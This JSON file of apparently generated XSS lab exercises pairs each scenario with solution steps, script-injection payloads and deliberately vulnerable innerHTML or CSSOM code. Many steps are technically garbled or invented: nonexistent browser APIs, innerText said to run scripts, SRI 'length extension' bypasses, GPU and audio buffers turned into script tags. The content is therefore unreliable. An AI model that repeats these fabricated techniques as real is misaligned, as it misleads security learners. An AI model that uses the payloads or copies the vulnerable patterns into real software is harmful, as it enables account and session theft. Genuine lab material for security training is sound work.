[
    {
      "Lab scenario": "XSS in WebAssembly Component Model Type Reflection",
      "Lab Description": "Plugin system uses WASM components with unsafe interface type reflection. The application renders component exports via innerHTML during debugging. To solve: Inject HTML through malformed UTF-8 in component adapter strings.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile malicious component with wasm-tools",
        "Craft payload: (adapter utf8 \"\\x3Cscript>alert(1)</script>\")",
        "Bypass UTF-8 validation using overlong encoding",
        "Chain with shared-everything linking model",
        "Verify via component registry dashboard"
      ],
      "payloads": [
        "(component (export \"\\uD83D\\uDC4D<script>\" (func)))",
        "data:application/wasm-component;base64,CmFkYXB0ZXIg..."
      ],
      "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndebugUI.innerHTML = JSON.stringify(component.exports);"
    },
    {
      "Lab scenario": "CSS Masonry Layout XSS in Design Portfolio",
      "Lab Description": "Portfolio builder implements CSS masonry layouts with unsafe grid-template-area names. The application reflects user input in CSSOM via insertRule(). To solve: Break layout context through area name injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify masonry container via DevTools",
        "Craft payload: grid-template-areas: \"</style><svg/onload=alert(1)>\"",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with @supports selector() fallback",
        "Verify through PDF export"
      ],
      "payloads": [
        "grid-template-areas: \"\\3C script\\3E alert(1) \\3C /script\\3E\"",
        "@container (width: </style><script>alert(1)</script>)"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`.gallery { ${userInput} }`);"
    },
    {
      "Lab scenario": "Web Serial API XSS in Industrial Control System",
      "Lab Description": "SCADA interface processes serial port data with unsafe TextDecoderStream handling. The application renders device output via innerText with CSS unescape. To solve: Spoof serial devices with payloads in handshake messages.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Program Arduino to send malicious serial data",
        "Craft payload: \"BAUDRATE: 9600\\n<script>alert(1)</script>\\n\"",
        "Bypass input validation using flow control",
        "Automate with Web Serial polyfill",
        "Verify through HMI dashboard"
      ],
      "payloads": [
        "serialPort.writable.getWriter().write(new TextEncoder().encode('</script><svg onload=alert(1)>'))",
        "{\"vendorId\":1337,\"productId\":7331,\"serialNumber\":\"<iframe/src=javascript:alert(1)>\"}"
      ],
      "srcCode": "const reader = port.readable.getReader();\nreader.read().then(({value}) => {\n  statusDiv.innerText += new TextDecoder().decode(value); // Vulnerable unescape"
    },
    {
      "Lab scenario": "Import Maps Integrity Bypass in Micro-Frontend Host",
      "Lab Description": "Cloud platform dynamically constructs import maps from URL parameters with lax integrity checks. To solve: Hijack module resolution via hash collision attacks.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept import map request via MitM",
        "Craft payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
        "Bypass SRI using length extension attacks",
        "Automate with Playwright interception",
        "Verify through dependency graph"
      ],
      "payloads": [
        "<script type=\"importmap\">{\"imports\":{\"@core/\":\"javascript:alert(1)\"}}</script>",
        "import('data:text/javascript,alert(document.domain)')"
      ],
      "srcCode": "app.get('/config', (req, res) => {\n  res.json(JSON.parse(req.query.imports)); // Vulnerable"
    },
    {
      "Lab scenario": "SVG Font Loading XSS in E-Learning Platform",
      "Lab Description": "Courseware renders SVG fonts with unsafe <hkern> element parsing. The application uses DOMPurify 3.0.0 with whitelisted font tags. To solve: Inject XSS through glyph kerning pair overflows.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create malicious SVG font using FontForge",
        "Craft payload: <hkern g1=\"</font><script>alert(1)</script>\" g2=\"x\"/>",
        "Bypass MIME validation via polyglot SVG/ZIP",
        "Chain with CSS font-palette",
        "Verify through course certificate generation"
      ],
      "payloads": [
        "<font><hkern g1=\"\\3C script\\3E\" g2=\"alert(1)\"/>",
        "@font-face { src: url('data:image/svg+xml,<svg>...</svg>') }"
      ],
      "srcCode": "courseRenderer.loadFont(userFont).then(() => {\n  viewerDiv.innerHTML = courseContent; // Vulnerable\n});"
    }
    ,
   
        {
          "Lab scenario": "WebGPU Shader Storage Buffer XSS in 3D Molecular Viewer",
          "Lab Description": "Biotech platform visualizes proteins using WebGPU storage buffers mapped to DOM elements. The application displays raw buffer data via innerHTML during debug mode. To solve: Corrupt GPU buffers to inject HTML payloads through out-of-bounds writes.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Reverse-engineer shader bind groups via WebGPU Inspector",
            "Craft payload: [[group(2), binding(0)]] var<storage> x: array<u32> = [0x3C, 0x73, 0x63];",
            "Bypass bounds checks using dynamic workgroup sizes",
            "Chain with indirect dispatch validation bypass",
            "Verify through electron density map overlay"
          ],
          "payloads": [
            "new Uint32Array([0x3C736372]).buffer",
            "dispatchWorkgroups(65535,1,1) // Force OOB write"
          ],
          "srcCode": "const buffer = device.createBuffer({ usage: GPUBufferUsage.STORAGE });\ndocument.getElementById('debug').innerHTML = new TextDecoder().decode(buffer.getMappedRange());"
        },
        {
          "Lab scenario": "CSS Anchor Positioning Bypass in Legal Document Editor",
          "Lab Description": "Contract drafting tool implements anchor positioning with unsafe grid-area names. The application reflects user input in CSSOM via insertRule(). To solve: Escape style isolation through grid-template-area injection.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Identify anchor targets via DevTools",
            "Craft payload: grid-template-areas: \"</style><svg/onload=alert(1)>\"",
            "Bypass sanitizer using CSS unicode escapes",
            "Chain with @container size queries",
            "Verify through PDF export"
          ],
          "payloads": [
            "grid-template-areas: \"\\3C script\\3E alert(1) \"",
            "@anchor --x { grid-area: </style><script>alert(1)</script> }"
          ],
          "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userStyles} }`);\ndocument.adoptedStyleSheets.push(sheet);"
        },
        {
          "Lab scenario": "WebHID Glucose Monitor XSS in Telehealth Platform",
          "Lab Description": "Patient portal connects to medical devices with unsafe HID report parsing. The application renders device data via innerText with CSS unescape. To solve: Spoof medical device metadata with XSS payloads.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Emulate device using Teensy 4.1",
            "Craft payload: \"productName\": \"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"",
            "Bypass report validation using vendor-specific pages",
            "Automate with WebHID polyfill",
            "Verify through patient chart rendering"
          ],
          "payloads": [
            "{\"vendorId\":0x1234,\"productId\":0x5678,\"reportData\":[0x3C,0x73,0x63,0x72]}",
            "navigator.hid.requestDevice({ filters: [{ usagePage: 0xFF00 }] })"
          ],
          "srcCode": "device.addEventListener('inputreport', e => {\n  chartDiv.innerText += new TextDecoder().decode(e.data.buffer); // Vulnerable CSS unescape"
        },
        {
          "Lab scenario": "Fetch Metadata Injection in Ad Tech Auction",
          "Lab Description": "Real-time bidding platform reflects Sec-Fetch-* headers in debug logs without encoding. To solve: Bypass CORS via request smuggling with XSS payloads in metadata headers.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Intercept bid request via Burp Suite",
            "Inject payload: Sec-Fetch-Dest: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
            "Bypass HPACK compression using literal headers",
            "Automate with Python requests-h2",
            "Verify through bid analytics dashboard"
          ],
          "payloads": [
            "Sec-Fetch-User: ?1<script>alert(1)</script>",
            "Priority: u=3, i=\"javascript:alert(document.domain)\""
          ],
          "srcCode": "app.get('/debug', (req, res) => {\n  res.send(`<pre>${req.headers['sec-fetch-site']}</pre>`); // Vulnerable"
        },
        {
          "Lab scenario": "ARIA 2.0 Live Region XSS in Social Feed",
          "Lab Description": "Accessibility-focused platform implements aria-braillelabel with dangerous DOM reflection. The application uses innerHTML for screen reader announcements. To solve: Abuse braille attribute parsing to inject scripts.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Trigger high-priority live region update",
            "Craft payload: <div aria-braillelabel=\"</div><script>alert(1)</script>\">",
            "Bypass sanitizer using Unicode bidi override",
            "Chain with aria-atomic=\"true\"",
            "Verify through NVDA screen reader"
          ],
          "payloads": [
            "<span role=\"alert\" aria-brailleroledescription=\"<script>\">",
            "<div aria-live=\"assertive\" aria-braillelabel=\"\\202E}\\202Ealert(1)//\"></div>"
          ],
          "srcCode": "function announce(text) {\n  liveRegion.innerHTML = `<div role=\"status\">${text}</div>`; // Vulnerable\n}"
        },
     
            {
              "Lab scenario": "WebCodecs Video Frame Injection in Live Streaming Moderation",
              "Lab Description": "Content moderation tool processes H.265 video streams with unsafe SEI message handling. The application injects user-controlled metadata into <canvas> via innerHTML. To solve: Achieve XSS through crafted Supplemental Enhancement Information payloads.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Intercept video stream using FFmpeg",
                "Inject payload: SEI UUID: <script>alert(1)</script>",
                "Bypass Content-Type validation using fragmented NAL units",
                "Chain with WebGL texture sampling",
                "Verify through moderation overlay"
              ],
              "payloads": [
                "videoFrame.copyTo(new Uint8Array([...'<script>alert(1)</script>']))",
                "sei_payload = new Uint8Array([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E])"
              ],
              "srcCode": "const decoder = new VideoDecoder({\n  output: frame => {\n    overlayDiv.innerHTML += parseSEI(frame); // Vulnerable\n  }\n});"
            },
            {
              "Lab scenario": "Private Network Access Bypass in Internal CRM",
              "Lab Description": "Enterprise CRM implements PNA with insecure cross-origin opener policy. The application trusts 192.168.* origins for postMessage handling. To solve: Bypass PNA via DNS rebinding and inject XSS through relaxed COOP headers.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Configure DNS rebinding to internal IP",
                "Craft payload: window.opener.postMessage('<img/src=x onerror=alert(1)>','*')",
                "Bypass CORS using 103 Early Hints responses",
                "Automate with dnsmasq + Puppeteer cluster",
                "Verify through sales pipeline dashboard"
              ],
              "payloads": [
                "<iframe src='http://[::ffff:127.0.0.1]'></iframe>",
                "fetch('http://10.0.0.1', {mode: 'no-cors', headers: {'X-Payload': '<script>'}})"
              ],
              "srcCode": "window.addEventListener('message', (e) => {\n  if (e.origin.startsWith('http://192.168')) {\n    document.body.innerHTML = e.data; // Vulnerable\n  }\n});"
            },
            {
              "Lab scenario": "Import Maps Sandbox Escape in Plugin Architecture",
              "Lab Description": "Modular app platform dynamically constructs import maps from URL parameters with lax Content-Security-Policy. To solve: Hijack module loading via type confusion in import assertions.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Intercept import map request via Service Worker",
                "Inject payload: {\"imports\":{\"@core/\":\"data:text/html,<script>alert(1)</script>\"}}",
                "Bypass SRI using hash length extension attacks",
                "Chain with modulepreload speculation rules",
                "Verify through plugin dependency tree"
              ],
              "payloads": [
                "import('data:text/javascript;base64,YWxlcnQoMSk=','assertion')",
                "<script type=\"importmap\">{\"imports\":{\"react\":\"javascript:alert(document.domain)\"}}</script>"
              ],
              "srcCode": "app.get('/import-map', (req, res) => {\n  res.json(JSON.parse(req.query.config)); // Vulnerable\n});"
            },
            {
              "Lab scenario": "WebTransport Session Hijacking in Drone Fleet Control",
              "Lab Description": "UAV management system uses WebTransport for telemetry with unsafe stream concatenation. The application renders binary streams via innerHTML without validation. To solve: Inject fragmented XSS payloads through QUIC connection migration.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Capture WebTransport handshake using Wireshark",
                "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
                "Bypass MTU limits using DATAGRAM frame fragmentation",
                "Automate with webtransport-py client",
                "Verify through 3D flight path visualization"
              ],
              "payloads": [
                "quic.SendDatagram([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E])",
                "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
              ],
              "srcCode": "const decoder = new TextDecoder();\ntransport.datagrams.readable.getReader().read().then(({value}) => {\n  telemetryDiv.innerHTML += decoder.decode(value); // Vulnerable\n});"
            },
            {
              "Lab scenario": "SVG Filter Primitive XSS in Scientific Visualization",
              "Lab Description": "Research platform implements SVG feImage with unsafe data: URI handling. The application allows user-controlled filter chains via innerHTML. To solve: Achieve XSS through filter composition and feImage href injection.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Identify filter application via Elements panel",
                "Craft payload: <feImage href='data:text/html,<script>alert(1)</script>'/>",
                "Bypass CSP using filter primitive chaining",
                "Chain with <animate> timing attacks",
                "Verify through vector field rendering"
              ],
              "payloads": [
                "<filter id='x'><feImage result='xss' href='data:text/html,<script>alert(1)</script>'/></filter>",
                "<feComponentTransfer><feFuncR type='table' tableValues='</text><script>alert(1)</script>'/>"
              ],
              "srcCode": "const svg = `<svg>${userFilters}</svg>`;\ndocument.body.insertAdjacentHTML('beforeend', svg); // Vulnerable"
            },

           
                {
                  "Lab scenario": "WebGPU Compute Shader Memory Corruption in Financial Fraud Detection",
                  "Lab Description": "Fraud analytics platform uses WebGPU compute shaders for transaction pattern matching. The application maps GPU buffers to debug UI via innerHTML without validation. To solve: Corrupt shared memory through out-of-bounds atomic operations to inject HTML payloads.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Analyze buffer bindings via WebGPU Inspector",
                    "Craft payload: [[group(2), binding(0)]] var<storage, atomic> x: array<u32> = [0x3C736372];",
                    "Bypass bounds checks using workgroup overflow",
                    "Chain with indirect dispatch validation bypass",
                    "Verify through transaction anomaly overlay"
                  ],
                  "payloads": [
                    "atomicAdd(&x[0], 0x3C736372) <!-- Hex for <script> -->",
                    "dispatchWorkgroups(0xFFFFFFFF,1,1) <!-- Force OOM -->"
                  ],
                  "srcCode": "const buffer = device.createBuffer({ usage: GPUBufferUsage.STORAGE });\ndocument.getElementById('debug').innerHTML = \n  new TextDecoder().decode(buffer.getMappedRange());"
                },
                {
                  "Lab scenario": "CSS Font Tech XSS in Branding Platform",
                  "Lab Description": "Corporate branding tool implements variable fonts with unsafe axis handling. The application allows user-controlled font-variation-settings via CSSOM. To solve: Break style context through axis name injection.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Create malicious variable font using Axis Praxis",
                    "Craft payload: font-variation-settings: \"</style><script>alert(1)</script>\" 500;",
                    "Bypass axis validation using fractional values",
                    "Chain with @font-palette-values",
                    "Verify through brand guideline PDF export"
                  ],
                  "payloads": [
                    "@font-face { font-family: x; src: url('data:font/woff2;base64,...') }",
                    "font-variation-settings: \"\\3C script\\3E\" 1"
                  ],
                  "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userFontRules} }`);"
                },
                {
                  "Lab scenario": "WebNFC NDEF Type Spoofing in Smart Retail",
                  "Lab Description": "Checkout system processes NFC tags with unsafe NDEF type validation. The application renders product types via innerHTML without sanitization. To solve: Spoof NDEF records with javascript: payloads in type fields.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Program NFC tag with PN532 module",
                    "Craft payload: NDEFRecord({ recordType: 'text/javascript', data: new TextEncoder().encode('alert(1)') })",
                    "Bypass MIME checks using UTF-16 encoding",
                    "Automate with WebNFC polyfill",
                    "Verify through POS terminal interface"
                  ],
                  "payloads": [
                    "ndefWriter.write({ records: [{ recordType: 'javascript:alert(1)', data: new DataView(new ArrayBuffer(0)) }] })",
                    "navigator.nfc.push('javascript:/*%00*/alert(document.cookie)')"
                  ],
                  "srcCode": "navigator.nfc.watch(message => {\n  productDisplay.innerHTML = message.records[0].recordType; // Vulnerable\n});"
                },
                {
                  "Lab scenario": "ARIA 2.0 Reflection XSS in Accessibility Dashboard",
                  "Lab Description": "WCAG audit tool implements aria-keyshortcuts with dangerous DOM reflection. The application uses element.outerHTML to display ARIA states. To solve: Abuse aria-colcount to clobber DOM properties.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify ARIA 2.0 reflection via a11y tree",
                    "Craft payload: <table aria-colcount=\"</table><script>alert(1)</script>\"></table>",
                    "Bypass sanitizer using aria-atomic=\"true\"",
                    "Chain with shadow DOM slot distribution",
                    "Verify through axe-core audit results"
                  ],
                  "payloads": [
                    "<div role='grid' aria-rowindex='<iframe/src=javascript:alert(1)>'></div>",
                    "<span role='math' aria-describedat='\\3C script\\3E'></span>"
                  ],
                  "srcCode": "element.setAttribute('aria-keyshortcuts', userInput);\nauditLog.innerHTML = element.outerHTML; // Vulnerable reflection"
                },
                {
                  "Lab scenario": "WebHID PLC Controller Spoofing in Manufacturing System",
                  "Lab Description": "Factory automation interface connects to Programmable Logic Controllers via WebHID. The application renders debug logs via innerText with CSS unescape. To solve: Spoof HID reports with malicious ladder logic payloads.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Emulate PLC using Teensy 4.1",
                    "Craft payload: {\"reportId\":1,\"reportData\":[0x3C,0x73,0x63,0x72]}",
                    "Bypass validation using vendor-specific usage pages",
                    "Automate with WebHID report listener",
                    "Verify through SCADA dashboard"
                  ],
                  "payloads": [
                    "inputReport: new Uint8Array([0x3C,0x73,0x63,0x72,0x69,0x70,0x74,0x3E])",
                    "{\"vendorId\":0x1337,\"productId\":0x7331,\"serialNumber\":\"<svg/onload=alert(1)>\"}"
                  ],
                  "srcCode": "device.addEventListener('inputreport', e => {\n  debugConsole.innerText += new TextDecoder().decode(e.data.buffer); // Vulnerable unescape\n});"
                },
               
                    {
                      "Lab scenario": "WebAssembly Garbage Collection XSS in Blockchain Explorer",
                      "Lab Description": "Blockchain analyzer uses WASM GC for smart contract debugging with unsafe externref handling. The application reflects garbage-collected object metadata via innerHTML. To solve: Corrupt GC references to inject HTML through malformed type arrays.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Compile WASM with circular externrefs",
                        "Craft payload: (externref (ref.null extern)) (global.set $x (ref.extern 0x3C736372))",
                        "Bypass type checks using multi-table linking",
                        "Chain with exception handling postMessage",
                        "Verify via contract debug console"
                      ],
                      "payloads": [
                        "new ExternRef(null).toString() = '<script>'",
                        "data:application/wasm;base64,AGFzbQEAAAABBwF/AkAACgEBAX8BAAALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
                      ],
                      "srcCode": "const instance = await WebAssembly.instantiate(gcWasm);\ndebugUI.innerHTML = instance.exports.inspectHeap();"
                    },
                    {
                      "Lab scenario": "CSS Animation Timeline XSS in Interactive Story Platform",
                      "Lab Description": "Multimedia platform implements scroll-driven animations with unsafe timeline name reflection. The application allows user-controlled animation-timeline names via CSSOM. To solve: Break style context through timeline identifier injection.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify timeline binding via Animations panel",
                        "Craft payload: animation-timeline: --</style><script>alert(1)</script>",
                        "Bypass sanitizer using CSS escape sequences",
                        "Chain with @scroll-timeline polyfill",
                        "Verify through EPUB export"
                      ],
                      "payloads": [
                        "@keyframes x { timeline-scope: \\3C script\\3E }",
                        "animation: x linear; animation-timeline: --\\3C script\\3E"
                      ],
                      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`@keyframes ${userInput} { ... }`);"
                    },
                    {
                      "Lab scenario": "WebTransport QUIC 0-RTT XSS in Real-Time Trading Platform",
                      "Lab Description": "Stock trading system uses QUIC 0-RTT early data with unsafe session resumption. The application processes early data via innerHTML without validation. To solve: Poison QUIC session tickets with XSS payloads.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Capture QUIC handshake using qlog",
                        "Craft payload: early_data = '<script>alert(1)</script>'",
                        "Bypress replay protection using PSK rotation",
                        "Automate with ngtcp2 client",
                        "Verify through order book visualization"
                      ],
                      "payloads": [
                        "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/3",
                        "Early-Data: 1\n\n<svg/onload=alert(document.cookie)>"
                      ],
                      "srcCode": "app.use((req, res) => {\n  if (req.earlyData) {\n    res.send(`Early data: ${req.query.q}`); // Vulnerable\n  }\n});"
                    },
                    {
                      "Lab scenario": "SVG Animation Target XSS in Digital Signage",
                      "Lab Scenario": "Advertisement platform implements SVG animations with unsafe target element resolution. The application processes <animate> href attributes without namespace validation. To solve: Hijack animation targets to override DOM attributes.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify animation targets via Performance panel",
                        "Craft payload: <animate href=\"#x\" attributeName=\"xlink:href\" to=\"javascript:alert(1)\"/>",
                        "Bypass sanitizer using SMIL begin timing",
                        "Chain with <discard> race conditions",
                        "Verify through ad content updates"
                      ],
                      "payloads": [
                        "<set attributeName=\"href\" to=\"data:text/html,<script>alert(1)</script>\"/>",
                        "<animate values=\"javascript:alert(1)\" begin=\"1s\"/>"
                      ],
                      "srcCode": "signageEngine.loadSVG(userContent).then(svg => {\n  document.body.appendChild(svg); // Vulnerable\n});"
                    },
                    {
                      "Lab scenario": "WebCodecs AudioFrame PCM XSS in Voice Chat",
                      "Lab Description": "Voice chat platform processes raw PCM samples with unsafe waveform visualization. The application maps audio buffers to <canvas> via innerHTML. To solve: Inject payloads through crafted sample values matching ASCII <script>.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Generate malicious WAV file with Audacity",
                        "Craft payload: PCM samples = [0.000060, 0.000115, ...] (Hex <script>)",
                        "Bypass sample rate validation using resampling",
                        "Chain with Web Audio API AnalyserNode",
                        "Verify through waveform SVG export"
                      ],
                      "payloads": [
                        "new AudioData({ sampleRate: 44100, data: new Float32Array([0.000060, 0.000115, ...]) })",
                        "data:audio/wav;base64,UklGRl9... (malicious samples)"
                      ],
                      "srcCode": "const decoder = new AudioDecoder({\n  output: frame => {\n    waveformDiv.innerHTML = visualize(frame); // Vulnerable\n  }\n});"
                    }
                  
            
        
      
  ]